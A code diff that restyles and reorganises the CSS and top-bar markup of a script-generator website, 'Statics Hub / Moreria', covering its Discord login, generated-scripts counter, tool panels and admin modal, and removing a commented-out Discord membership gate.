-    opacity: 0.7;
-  }
-  .tool-card:hover {
-    border-color: rgba(141,255,209,0.56);
-    box-shadow: 0 28px 70px rgba(0,0,0,0.42), 0 0 0 1px rgba(141,255,209,0.08);
-    transform: translateY(-7px);
-  }
-  .tool-card:hover::before { transform: scaleY(1); }
-  .tool-icon {
-    height: 122px;
-    width: 100%;
-    padding: 1rem;
-    align-items: flex-start;
-    justify-content: flex-start;
-    background: rgba(5,9,14,0.32);
-    border: 1px solid rgba(169,193,219,0.12);
-    border-radius: 12px;
-    opacity: 1;
-  }
-  .tool-icon img { max-height: 92px; max-width: 170px; filter: grayscale(0.35) contrast(1.1); }
-  .tool-card:hover .tool-icon img { filter: grayscale(0) contrast(1.12); }
-  .tool-name {
-    color: var(--text);
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 1.08rem;
-    letter-spacing: 0.03em;
-  }
-  .tool-desc { color: var(--muted); font-size: 0.7rem; line-height: 1.7; }
-  .credits-card-mark {
-    width: 76px;
-    height: 76px;
-    border-color: rgba(141,255,209,0.5);
-    color: var(--neon);
-    background: rgba(141,255,209,0.06);
-    box-shadow: inset 0 0 24px rgba(141,255,209,0.08);
-  }
-  .top-hitters-section {
-    max-width: 1120px;
-    margin-top: 4.2rem;
-    padding-top: 1.35rem;
-    border-top-color: var(--border);
-  }
-  .top-hitters-title { color: var(--text); letter-spacing: 0.12em; }
-  .hitter-card {
-    background: linear-gradient(145deg, rgba(24,35,51,0.86), rgba(13,18,26,0.92));
-    border-color: var(--border) !important;
-    border-radius: 12px;
-    box-shadow: 0 16px 35px rgba(0,0,0,0.2);
-  }
-  .hitter-card::before { background: var(--neon); }
-  .hitter-card:hover { border-color: rgba(141,255,209,0.48) !important; }
-  .hitter-count { color: var(--neon); text-shadow: var(--neon-glow); }
-  .hitter-avatar { border-color: rgba(141,255,209,0.55); filter: none; }
-  .back-button {
-    top: 88px;
-    left: clamp(1rem, 4vw, 3.5rem);
-    background: rgba(18,26,37,0.9);
-    border-color: var(--border-strong);
-    border-radius: 9px;
-    color: var(--neon);
-    box-shadow: 0 10px 24px rgba(0,0,0,0.2);
-  }
-  .back-button:hover { background: #182333; border-color: var(--neon); box-shadow: var(--neon-glow); }
-  .tool-wrapper, .credits-wrapper { max-width: 980px; padding-top: 8rem; }
-  .tool-header { margin-bottom: 2.8rem; }
-  .tool-header h1 { color: var(--text); font-size: clamp(2.1rem, 5vw, 3.7rem); letter-spacing: -0.055em; }
-  .tool-header .tagline { color: var(--neon); opacity: 0.78; letter-spacing: 0.16em; }
-  .panel, .gag2-panel, .credits-panel {
-    background: linear-gradient(145deg, rgba(20,30,43,0.96), rgba(12,17,25,0.96));
-    border-color: var(--border);
-    border-radius: 14px;
-    box-shadow: 0 20px 55px rgba(0,0,0,0.24), inset 0 1px 0 rgba(255,255,255,0.035);
-  }
-  .ph, .out-ph, .gag2-ph, .credits-panel-head {
-    background: rgba(24,35,51,0.72);
-    border-color: var(--border);
-  }
-  .ph-title, .out-ph-title, .gag2-ph-title, .credits-panel-title { color: var(--neon); text-shadow: none; }
-  .pb, .gag2-pb { padding: 1.4rem; }
-  .search-input, .txt, .gag2-f-input, .chat-input, .role-name-input, .role-select,
-  #pasteCustomListContainer textarea {
-    background: rgba(6,10,15,0.7);
-    border-color: var(--border);
-    border-radius: 9px;
-  }
-  .search-input:focus, .txt:focus, .gag2-f-input:focus, .chat-input:focus,
-  .role-name-input:focus, .role-select:focus, #pasteCustomListContainer textarea:focus {
-    border-color: var(--neon);
-    box-shadow: 0 0 0 3px rgba(141,255,209,0.1), 0 0 24px rgba(141,255,209,0.1);
-  }
-  .animal-list, .code-block, .gag2-code-block {
-    background: rgba(5,9,14,0.72);
-    border-color: var(--border);
-    border-radius: 10px;
-  }
-  .a-item:hover, .suggestion-item:hover, .gag2-suggestion-item:hover { background: rgba(141,255,209,0.06); }
-  .a-item.on { background: rgba(141,255,209,0.11); }
-  .a-item input[type="checkbox"] { border-color: rgba(141,255,209,0.66); background: rgba(5,9,14,0.72); }
-  .a-item input[type="checkbox"]:checked { background: var(--neon); border-color: var(--neon); box-shadow: var(--neon-glow); }
-  .badge-og { color: var(--neon); border-color: rgba(141,255,209,0.5); background: var(--neon-soft); }
-  .badge-secret { color: #b9c5d3; border-color: var(--border-strong); background: rgba(169,193,219,0.06); }
-  .btn-sm, .btn-copy, .admin-mode-btn, .gag2-admin-mode-btn, #customBrainrotInput button,
-  #pasteCustomListContainer button, .btn-add-role, .btn-assign-role {
-    background: rgba(141,255,209,0.06);
-    border-color: rgba(141,255,209,0.35);
-    color: var(--neon);
-    border-radius: 8px;
-  }
-  .btn-sm:hover, .btn-copy:hover, .admin-mode-btn:hover:not(.active), .gag2-admin-mode-btn:hover,
-  #customBrainrotInput button:hover, #pasteCustomListContainer button:hover,
-  .btn-add-role:hover, .btn-assign-role:hover { background: rgba(141,255,209,0.14); }
-  .btn-gen, .gag2-btn-gen {
-    background: linear-gradient(100deg, var(--neon), #b8ffe7);
-    color: #07110f;
-    border-radius: 10px;
-    box-shadow: 0 12px 28px rgba(141,255,209,0.18);
-    font-family: 'Space Grotesk', sans-serif;
-  }
-  .btn-gen:hover, .gag2-btn-gen:hover {
-    background: linear-gradient(100deg, #b8ffe7, var(--neon));
-    box-shadow: 0 16px 36px rgba(141,255,209,0.3);
-    transform: translateY(-2px);
-  }
-  .admin-mode-btn.active, .gag2-admin-mode-btn.active {
-    background: var(--neon);
-    border-color: var(--neon);
-    color: #07110f;
-    box-shadow: var(--neon-glow);
-  }
-  .code-block, .gag2-code-block { color: #c9ffe9; }
-  .chat-toggle {
-    width: 58px;
-    height: 58px;
-    right: 1.5rem;
-    bottom: 1.5rem;
-    background: var(--neon);
-    color: #07110f;
-    border-radius: 16px;
-    box-shadow: 0 14px 30px rgba(0,0,0,0.3), var(--neon-glow);
-  }
-  .chat-toggle:hover { transform: translateY(-4px) rotate(-2deg); }
-  .chat-panel, .admin-modal-box, .modal-box {
-    background: linear-gradient(145deg, #182333, #0e141d);
-    border-color: var(--border-strong);
-    border-radius: 16px;
-    box-shadow: 0 28px 90px rgba(0,0,0,0.56), 0 0 0 1px rgba(141,255,209,0.04);
-  }
-  .chat-header, .chat-input-area, .admin-header { background: rgba(24,35,51,0.84); border-color: var(--border); }
-  .modal-overlay { background: rgba(1,4,8,0.78); backdrop-filter: blur(12px); }
-  .modal-box { max-width: 480px; padding: clamp(1.6rem, 5vw, 2.5rem); }
-  .modal-box h2 { color: var(--text); font-size: clamp(1.5rem, 4vw, 2rem); letter-spacing: -0.04em; }
-  .modal-box p { color: var(--muted); line-height: 1.7; }
-  .auth-eyebrow {
-    margin-bottom: 0.8rem;
-    color: var(--neon);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.64rem;
-    letter-spacing: 0.2em;
-    text-transform: uppercase;
-  }
-  .auth-status {
+  .brand-mini::before { content: '◈'; color: var(--neon); margin-right: 0.55rem; font-size: 0.75em; }
+  .brand-mini span { color: var(--muted); font-size: 0.58rem; letter-spacing: 0.18em; margin-left: 0.35rem; }
+  .counter-widget {
     display: flex;
     align-items: center;
-    gap: 0.55rem;
-    min-height: 2.5rem;
-    margin: 1.25rem 0 1rem;
+    gap: 0.5rem;
+    padding-left: clamp(0.8rem, 2.5vw, 2rem);
+    border-left: 1px solid var(--border);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.72rem;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    color: var(--muted);
+  }
+  .counter-widget .counter-num { font-size: 1rem; color: var(--neon); text-shadow: var(--neon-glow); font-weight: bold; }
+  .counter-dot {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--neon);
+    box-shadow: 0 0 12px rgba(141,255,209,0.62);
+    animation: blink 2s infinite;
+  }
+  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+  .login-area { display: flex; align-items: center; gap: 0.6rem; }
+  .btn-discord {
+    display: flex; align-items: center; gap: 0.5rem;
+    padding: 0.4rem 0.9rem;
+    background: var(--discord); border: none; border-radius: 8px;
+    color: white; font-family: 'Space Grotesk', sans-serif;
+    font-size: 0.72rem; font-weight: 700;
+    text-transform: uppercase; letter-spacing: 0.04em;
+    cursor: pointer; transition: all 0.2s;
+    box-shadow: 0 8px 22px rgba(114,137,218,0.25);
+  }
+  .btn-discord:hover { background: #879bfa; box-shadow: 0 10px 28px rgba(114,137,218,0.4); transform: translateY(-1px); }
+  .btn-discord:disabled { opacity: 0.7; cursor: wait; transform: none; }
+  .btn-discord svg { width: 16px; height: 16px; }
+  .user-chip {
+    display: none; align-items: center; gap: 0.5rem;
+    background: rgba(18, 26, 37, 0.92);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 0.3rem 0.7rem;
+    box-shadow: inset 0 1px 0 rgba(255,255,255,0.04);
+  }
+  .user-chip.show { display: flex; }
+  .user-avatar {
+    width: 26px; height: 26px; border-radius: 50%;
+    object-fit: cover; border: 1px solid var(--neon);
+    background: var(--surface);
+    box-shadow: 0 0 14px rgba(141,255,209,0.18);
+  }
+  .user-name { font-family: 'Share Tech Mono', monospace; font-size: 0.72rem; color: var(--text); }
+  .user-role-badge {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.6rem; padding: 1px 5px; border-radius: 3px;
+    text-transform: uppercase; letter-spacing: 0.05em; font-weight: bold;
+  }
+  .btn-logout {
+    padding: 0.3rem 0.6rem;
+    background: rgba(255,68,68,0.15);
+    border: 1px solid rgba(255,68,68,0.4);
+    border-radius: 8px; color: var(--danger);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.62rem; text-transform: uppercase;
+    cursor: pointer; transition: background 0.2s;
+  }
+  .btn-logout:hover { background: rgba(255,68,68,0.28); }
+  .btn-admin {
+    padding: 0.3rem 0.6rem;
+    background: rgba(141,255,209,0.1);
+    border: 1px solid rgba(141,255,209,0.4);
+    border-radius: 8px; color: var(--neon);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.62rem; text-transform: uppercase;
+    cursor: pointer; transition: background 0.2s;
+    display: none;
+  }
+  .btn-admin:hover { background: rgba(141,255,209,0.2); }
+  .btn-admin.show { display: block; }
+
+  /* MODALS */
+  .modal-overlay {
+    position: fixed; inset: 0;
+    background: rgba(1,4,8,0.78);
+    display: flex; align-items: center; justify-content: center;
+    z-index: 2000;
+    backdrop-filter: blur(12px);
+  }
+  .modal-overlay.hidden { display: none; }
+  .modal-box {
+    background: linear-gradient(145deg, #182333, #0e141d);
+    border: 1px solid var(--border-strong);
+    border-radius: 16px;
+    padding: clamp(1.6rem, 5vw, 2.5rem);
+    max-width: 480px; width: 90%;
+    text-align: center;
+    box-shadow: 0 28px 90px rgba(0,0,0,0.56), 0 0 0 1px rgba(141,255,209,0.04);
+    animation: fadeUp 0.3s ease both;
+  }
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: none; } }
+  .modal-box h2 {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: clamp(1.5rem, 4vw, 2rem);
+    font-weight: 700; color: var(--text);
+    letter-spacing: -0.04em; margin-bottom: 0.7rem;
+  }
+  .modal-box p {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.78rem; color: var(--muted);
+    line-height: 1.7; margin-bottom: 1.5rem;
+  }
+  .auth-eyebrow {
+    margin-bottom: 0.8rem; color: var(--neon);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.64rem; letter-spacing: 0.2em; text-transform: uppercase;
+  }
+  .auth-status {
+    display: flex; align-items: center; gap: 0.55rem;
+    min-height: 2.5rem; margin: 1.25rem 0 1rem;
     padding: 0.7rem 0.8rem;
     color: var(--neon);
     background: rgba(141,255,209,0.06);
     border: 1px solid rgba(141,255,209,0.2);
     border-radius: 8px;
     font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem;
-    letter-spacing: 0.12em;
+    font-size: 0.65rem; letter-spacing: 0.12em;
   }
   .auth-status::before {
-    content: '';
-    width: 7px;
-    height: 7px;
-    flex: 0 0 auto;
-    border-radius: 50%;
-    background: currentColor;
-    box-shadow: 0 0 12px currentColor;
+    content: ''; width: 7px; height: 7px;
+    flex: 0 0 auto; border-radius: 50%;
+    background: currentColor; box-shadow: 0 0 12px currentColor;
   }
   .auth-status[data-state="error"] { color: var(--danger); background: rgba(255,124,137,0.07); border-color: rgba(255,124,137,0.25); }
   .auth-status[data-state="loading"] { color: #b7c7ff; background: rgba(114,137,218,0.08); border-color: rgba(114,137,218,0.25); }
+  .modal-btns { display: flex; gap: 0.7rem; justify-content: center; flex-wrap: wrap; }
   .auth-note { margin-top: 1rem; font-size: 0.68rem; }
   .auth-recovery {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    gap: 0.8rem;
-    margin-top: 1.25rem;
-    padding-top: 1rem;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 0.8rem; margin-top: 1.25rem; padding-top: 1rem;
     border-top: 1px solid var(--border);
-    color: var(--muted);
-    font-size: 0.7rem;
+    color: var(--muted); font-size: 0.7rem;
   }
   .auth-recovery button {
-    padding: 0;
-    color: var(--neon);
-    background: none;
-    border: 0;
-    font: inherit;
-    font-weight: 700;
-    cursor: pointer;
+    padding: 0; color: var(--neon); background: none; border: 0;
+    font: inherit; font-weight: 700; cursor: pointer;
   }
   .auth-recovery button:hover { color: var(--text); }
-  .btn-discord:disabled { opacity: 0.7; cursor: wait; transform: none; }
-  .btn-logout { border-radius: 8px; }
-  :focus-visible { outline: 2px solid var(--neon); outline-offset: 3px; }
-  @media (prefers-reduced-motion: reduce) {
-    *, *::before, *::after {
-      animation-duration: 0.01ms !important;
-      animation-iteration-count: 1 !important;
-      scroll-behavior: auto !important;
-      transition-duration: 0.01ms !important;
-    }
+
+  /* MAIN */
+  .main-container {
+    max-width: 1120px;
+    margin: 0 auto;
+    padding: 150px 2rem 4rem;
+    position: relative;
+    z-index: 1;
   }
-  @media (max-width: 760px) {
-    .tool-selector { grid-template-columns: 1fr; }
-    .tool-card, .tool-card:first-child { min-height: 245px; }
-    .home-screen { padding-top: 8rem; }
-    .counter-widget span:not(.counter-num) { display: none; }
-    .counter-widget { gap: 0.4rem; }
+  .home-screen::before {
+    content: 'STATIC CONSOLE / MORERIA GENERATOR';
+    display: block; color: var(--neon); opacity: 0.82;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.67rem; letter-spacing: 0.24em;
+    margin-bottom: 1.2rem;
   }
-  @media (max-width: 460px) {
+  .home-title {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: clamp(3.4rem, 10vw, 8.5rem);
+    font-weight: 700; line-height: 0.84;
+    letter-spacing: -0.09em; color: var(--text);
+    text-shadow: 0 12px 45px rgba(0,0,0,0.36);
+    margin-bottom: 0;
+  }
+  .home-subtitle {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: clamp(2.5rem, 6.5vw, 5.7rem);
+    font-weight: 700; line-height: 0.92;
+    letter-spacing: -0.08em;
+    color: transparent;
+    background: linear-gradient(100deg, var(--neon), #b7c7ff 70%, #71819a);
+    -webkit-background-clip: text; background-clip: text;
+    margin-bottom: 1.3rem;
+  }
+  .home-subtitle-sub {
+    max-width: 680px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.72rem; color: var(--muted);
+    letter-spacing: 0.2em; line-height: 1.8;
+    margin-bottom: 3.1rem;
+  }
+
+  /* TOOL PANELS */
+  .tool-wrapper { max-width: 860px; margin: 0 auto; padding: 0 1.5rem 2rem; position: relative; z-index: 1; }
+  .tool-header { text-align: left; margin-bottom: 2.8rem; animation: fadeDown 0.55s ease both; }
+  @keyframes fadeDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: none; } }
+  .tool-header h1 {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: clamp(2.1rem, 5vw, 3.7rem);
+    font-weight: 700; letter-spacing: -0.055em;
+    text-transform: uppercase; color: var(--text);
+    line-height: 1;
+  }
+  .tool-header .tagline {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.75rem; letter-spacing: 0.16em;
+    text-transform: uppercase; color: var(--neon);
+    opacity: 0.78; margin-top: 0.4rem;
+  }
+  .panel {
+    background: linear-gradient(145deg, rgba(20,30,43,0.96), rgba(12,17,25,0.96));
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    overflow: hidden;
+    margin-bottom: 1.2rem;
+    animation: fadeUp 0.5s ease both;
+    box-shadow: 0 20px 55px rgba(0,0,0,0.24), inset 0 1px 0 rgba(255,255,255,0.035);
+  }
+  .panel:nth-child(1) { animation-delay: 0.05s; }
+  .panel:nth-child(2) { animation-delay: 0.13s; }
+  .panel:nth-child(3) { animation-delay: 0.21s; }
+  .ph {
+    display: flex; align-items: center; gap: 0.6rem;
+    padding: 0.75rem 1.4rem;
+    background: rgba(24,35,51,0.72);
+    border-bottom: 1px solid var(--border);
+  }
+  .dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; animation: blink 2.2s infinite; background: var(--neon); box-shadow: 0 0 12px rgba(141,255,209,0.62); }
+  .ph-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.72rem; text-transform: uppercase;
+    letter-spacing: 0.15em; color: var(--neon);
+  }
+  .pb { padding: 1.4rem; }
+  .lbl {
+    display: block;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.68rem; text-transform: uppercase;
+    letter-spacing: 0.13em; color: var(--muted);
+    margin-bottom: 0.45rem;
+  }
+  .search-row { display: flex; gap: 0.6rem; margin-bottom: 0.75rem; }
+  .search-input, .txt {
+    flex: 1; width: 100%;
+    background: rgba(6,10,15,0.7);
+    border: 1px solid var(--border);
+    border-radius: 9px;
+    padding: 0.55rem 0.85rem;
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.82rem;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  .search-input:focus, .txt:focus {
+    border-color: var(--neon);
+    box-shadow: 0 0 0 3px rgba(141,255,209,0.1), 0 0 24px rgba(141,255,209,0.1);
+  }
+  .search-input::placeholder, .txt::placeholder { color: var(--muted); }
+  .btn-sm {
+    padding: 0.5rem 0.9rem;
+    background: rgba(141,255,209,0.06);
+    border: 1px solid rgba(141,255,209,0.35);
+    border-radius: 8px; color: var(--neon);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.68rem; text-transform: uppercase;
+    letter-spacing: 0.08em; cursor: pointer;
+    white-space: nowrap; transition: background 0.2s;
+  }
+  .btn-sm:hover { background: rgba(141,255,209,0.14); }
+  .btn-sm.red { color: var(--danger); border-color: rgba(255,124,137,0.5); background: rgba(255,124,137,0.06); }
+  .btn-sm.red:hover { background: rgba(255,124,137,0.14); }
+  .animal-list {
+    background: rgba(5,9,14,0.72);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    height: 240px; overflow-y: auto;
+    scrollbar-width: thin; scrollbar-color: var(--neon) transparent;
+  }
+  .animal-list::-webkit-scrollbar { width: 4px; }
+  .animal-list::-webkit-scrollbar-thumb { background: var(--neon); border-radius: 4px; }
+  .a-item {
+    display: flex; align-items: center; gap: 0.65rem;
+    padding: 0.48rem 0.9rem; cursor: pointer;
+    border-bottom: 1px solid rgba(141,255,209,0.04);
+    transition: background 0.12s; user-select: none;
+  }
+  .a-item:last-child { border-bottom: none; }
+  .a-item:hover { background: rgba(141,255,209,0.06); }
+  .a-item.on { background: rgba(141,255,209,0.11); }
+  .a-item input[type="checkbox"] {
+    -webkit-appearance: none; appearance: none;
+    width: 13px; height: 13px;
+    border: 1px solid rgba(141,255,209,0.66);
+    border-radius: 3px;
+    background: rgba(5,9,14,0.72); cursor: pointer;
+    flex-shrink: 0; position: relative; outline: none;
+    transition: background 0.2s, border-color 0.2s;
+  }
+  .a-item input[type="checkbox"]:checked { background: var(--neon); border-color: var(--neon); box-shadow: var(--neon-glow); }
+  .a-item input[type="checkbox"]:checked::after {
+    content: '\2713'; position: absolute; color: black;
+    font-size: 8px; font-weight: bold;
+    top: 50%; left: 50%; transform: translate(-50%,-55%);
+  }
+  .a-name { font-size: 0.88rem; line-height: 1.2; flex: 1; color: var(--text); }
+  .badge-og {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px; font-weight: bold; text-transform: uppercase;
+    letter-spacing: 1px; padding: 2px 6px; border-radius: 4px;
+    background: var(--neon-soft); color: var(--neon);
+    border: 1px solid rgba(141,255,209,0.5); margin-left: 8px;
+  }
+  .meta-row { display: flex; justify-content: space-between; align-items: center; margin-top: 0.6rem; }
+  .sel-count { font-family: 'Share Tech Mono', monospace; font-size: 0.7rem; color: var(--muted); }
+  .sel-count span { color: var(--neon); }
+  .hint { font-family: 'Share Tech Mono', monospace; font-size: 0.67rem; color: var(--muted); margin-top: 0.4rem; }
+  .hint.error { color: var(--danger) !important; font-weight: bold; }
+  .btn-gen {
+    display: block; width: 100%; padding: 0.92rem;
+    background: linear-gradient(100deg, var(--neon), #b8ffe7);
+    border: none; border-radius: 10px;
+    color: #07110f;
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 1.1rem; font-weight: 700;
+    letter-spacing: 0.14em; text-transform: uppercase;
+    cursor: pointer; transition: all 0.2s;
+    box-shadow: 0 12px 28px rgba(141,255,209,0.18);
+    margin-bottom: 1.2rem;
+  }
+  .btn-gen:hover { background: linear-gradient(100deg, #b8ffe7, var(--neon)); box-shadow: 0 16px 36px rgba(141,255,209,0.3); transform: translateY(-2px); }
+  .btn-gen:disabled { opacity: 0.6; cursor: wait; transform: none; }
+  .out-ph {
+    display: flex; align-items: center; gap: 0.6rem;
+    padding: 0.75rem 1.4rem;
+    background: rgba(24,35,51,0.72);
+    border-bottom: 1px solid var(--border);
+  }
+  .out-ph-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.72rem; text-transform: uppercase;
+    letter-spacing: 0.15em; color: var(--neon);
+  }
+  .btn-copy {
+    margin-left: auto; padding: 0.26rem 0.7rem;
+    background: rgba(141,255,209,0.06);
+    border: 1px solid rgba(141,255,209,0.35);
+    border-radius: 8px; color: var(--neon);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.68rem; text-transform: uppercase;
+    letter-spacing: 0.1em; cursor: pointer;
+    transition: all 0.2s;
+  }
+  .btn-copy:hover { background: rgba(141,255,209,0.14); }
+  .btn-copy.ok { color: var(--green); border-color: var(--green); background: rgba(141,255,209,0.1); }
+  .code-block {
+    background: rgba(5,9,14,0.72);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1rem 1.2rem;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.79rem; line-height: 1.8;
+    color: #c9ffe9; min-height: 120px;
+    max-height: 480px; overflow-y: auto;
+    white-space: pre; overflow-x: auto;
+    scrollbar-width: thin; scrollbar-color: var(--border) transparent;
+  }
+  .code-block.empty { color: var(--muted); font-style: italic; white-space: pre-wrap; }
+  .toast {
+    position: fixed; bottom: 1.5rem; left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 0.75rem 1.4rem;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.72rem; color: var(--text);
+    z-index: 999; transition: transform 0.3s ease, opacity 0.3s ease;
+    opacity: 0; white-space: nowrap;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+  }
+  .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+  .toast.success { border-color: var(--green); color: var(--green); }
+  .toast.error { border-color: var(--danger); color: var(--danger); }
+
+  /* ADMIN PANEL */
+  .admin-modal-box {
+    background: linear-gradient(145deg, #182333, #0e141d);
+    border: 1px solid var(--border-strong);
+    border-radius: 16px;
+    width: 92%; max-width: 680px;
+    max-height: 85vh; overflow: hidden;
+    display: flex; flex-direction: column;
+    box-shadow: 0 28px 90px rgba(0,0,0,0.56);
+    animation: fadeUp 0.3s ease both;
+  }
+  .admin-header {
+    padding: 1rem 1.4rem;
+    background: rgba(24,35,51,0.84);
+    border-bottom: 1px solid var(--border);
+    display: flex; align-items: center; justify-content: space-between;
+  }
+  .admin-header h2 {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 1.1rem; font-weight: 700;
+    color: var(--text); letter-spacing: 0.1em; text-transform: uppercase;
+  }
+  .admin-close {
+    width: 28px; height: 28px;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    background: #1c1c1c; color: var(--neon);
+    font-size: 1rem; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    transition: background 0.2s;
+  }
+  .admin-close:hover { background: #2c2c2c; }
+  .admin-tabs { display: flex; border-bottom: 1px solid var(--border); }
+  .admin-tab {
+    flex: 1; padding: 0.7rem;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 0.72rem; text-transform: uppercase;
+    letter-spacing: 0.08em; text-align: center;
+    cursor: pointer; color: var(--muted);
+    transition: color 0.2s, background 0.2s;
+    border: none; background: none;
+  }
+  .admin-tab.active {
+    color: var(--text);
+    background: #202020;
+    border-bottom: 2px solid var(--neon);
+  }
+  .admin-body { flex: 1; overflow-y: auto; padding: 1.2rem; }
+  .admin-tab-pane { display: none; }
+  .admin-tab-pane.active { display: block; }
+
+  @media (max-width: 600px) {
     .top-bar { padding: 0 0.8rem; }
+    .top-left { gap: 0.8rem; }
+    .brand-mini { font-size: 0.74rem; }
     .brand-mini span { display: none; }
-    .brand-mini { letter-spacing: 0.1em; }
-    .btn-discord { padding-inline: 0.65rem; }
-    .user-name, .user-role-badge { display: none; }
-    .home-title { font-size: clamp(3rem, 17vw, 5rem); }
-    .home-subtitle { font-size: clamp(2.25rem, 12vw, 4rem); }
-    .tool-wrapper, .credits-wrapper { padding-inline: 1rem; }
-    .back-button { left: 1rem; }
+    .counter-widget { padding-left: 0.8rem; font-size: 0.58rem; }
+    .counter-widget span:not(.counter-num) { display: none; }
+    .main-container { padding: 120px 1rem 3rem; }
+    .home-title { font-size: clamp(3.1rem, 18vw, 5.5rem); }
+    .home-subtitle { font-size: clamp(2rem, 12vw, 4rem); }
   }
 </style>
 </head>
 <body>
 
-<!-- ═══ TOP BAR ═══ -->
+<!-- TOP BAR -->
 <div class="top-bar">
   <div class="top-left">
-    <div class="brand-mini">STATICS HUB <span>/ CONSOLE</span></div>
-    <!-- Scripts Counter -->
+    <div class="brand-mini">STATICS HUB <span>/ MORERIA</span></div>
     <div class="counter-widget">
       <div class="counter-dot"></div>
       <span>Scripts Generated:</span>
       <span class="counter-num" id="counterNum">0</span>
     </div>
   </div>
-
-  <!-- Login Area (top right) -->
   <div class="login-area">
     <button class="btn-discord" id="loginBtn" type="button" aria-busy="false" onclick="loginWithDiscord()">
       <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057.101 18.08.114 18.1.13 18.113a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
@@ -2025,31 +552,17 @@
   </div>
 </div>
 
-<!-- Server membership gate removed; Discord login is the only access requirement.
-<div class="modal-overlay hidden" id="serverGateModal">
-  <div class="server-gate-box">
-    <div class="gate-icon">🔒</div>
-    <h2>Members Only</h2>
-    <p>You must be in the <strong style="color:var(--neon)">Statics Hub</strong> Discord server to use this site.<br>Join the server, then sign in again.</p>
-    <a class="btn-join" href="https://discord.gg/dSjhj8Usjg" target="_blank">
-      <svg viewBox="0 0 24 24" fill="currentColor" style="width:15px;height:15px"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057.101 18.08.114 18.1.13 18.113a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.030z"/></svg>
-      Join Statics Hub Server
-    </a>
